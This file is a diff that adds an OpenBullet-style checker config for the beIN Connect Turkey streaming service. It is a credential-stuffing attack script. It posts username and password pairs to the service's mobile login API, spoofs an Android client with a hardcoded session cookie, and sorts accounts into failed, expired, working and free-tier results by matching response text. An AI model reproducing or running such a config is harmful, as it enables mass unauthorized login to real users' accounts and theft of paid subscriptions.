@@ -1,0 +1,86 @@
+[SETTINGS]
+{
+  "Name": "Api Bein Connect",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-16T17:17:17.5931247+03:00",
+  "AdditionalInfo": "",
+  "Author": "Astronot",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://mobileservice-v2.beinconnect.com.tr/api/account/login" 
+  CONTENT "{\"Username\":\"<USER>\",\"Password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "connection: Keep-Alive" 
+  HEADER "content-type: application/json; charset=utf-8" 
+  HEADER "cookie: uc=init=%22H4sIAAAAAAAEAGWRXU%2fDIBiF%2f0uvtaHt%2bjHvuta5Jq403aKXhsJrRtLCQmF%2bxf8u6MKiXp7zvLwcDh9BDSdOoWHBTcDQMilgsUwiFi%2fSiARXZ9qSCSwv27rHTf3UbXB76%2bH%2b7ehgd5ACvLlSRLiVuOuwN7eSwehGq36PkLfx%2fABq5lJYlIdRGHuy5mp6IQouPE493BDFfkMutN3%2fl%2f8DWyLMM6HaKFCXiM3cS6mt1sq4d%2byoAhA7%2fu4WZCHKrVcdTTlwq1%2bLzMvYaqImIAO%2fPuWutEoKAVTbUOduHpt1Y308l4oeXJ7s%2b%2fwleRqiEA1Z4kqpRg5CeybMOPrRleEja800uOQ%2f5A7kvaTE3eY%2bMUVF8vkFxnKStNYBAAA%3d%22&unid=d0938e4931d2451a&devt=dAxo7tBlQVqHITrBmPVUgF:APA91bGk8RxtbqCx9oPmfh8oIHYYMfRY6M-HTG7l23hf2_ByJoEvF9cHBST4vziNTTcPLE5r1vTDTuOuuPvDAwZiW4thiY0XJ_gMuOLc_LywHcUK-auzGPhqNotl1rlwWc5imfgOmNNS; TS01753cec=0179653557625a287e361cca11212c974a1ce326ac393af13d0b06843acadb4dc81fbee3eb486771cba95bb44904e9f3067bc0143b582fa020cfb9418367407774f1d6d96a" 
+  HEADER "host: mobileservice-v2.beinconnect.com.tr" 
+  HEADER "user-agent: Dalvik/2.1.0 (Linux; U; Android 7.1.2; PCRT00 Build/N2G48H)" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Üyelik ya da Şifre bilgisi geçersiz! Lütfen bilgilerinizi kontrol ederek tekrar deneyiniz." 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Bağlantı yaptığınız uygulama için uygun üyeliğiniz bulunamamıştır." 
+  KEYCHAIN Success OR 
+    KEY "isLogin\":true" 
+
+REQUEST GET "https://mobileservice-v2.beinconnect.com.tr/Account/Authorize" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST GET "https://mobileservice-v2.beinconnect.com.tr/Package/Index2" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Aktif bir paketin bulunmamaktadır" 
+
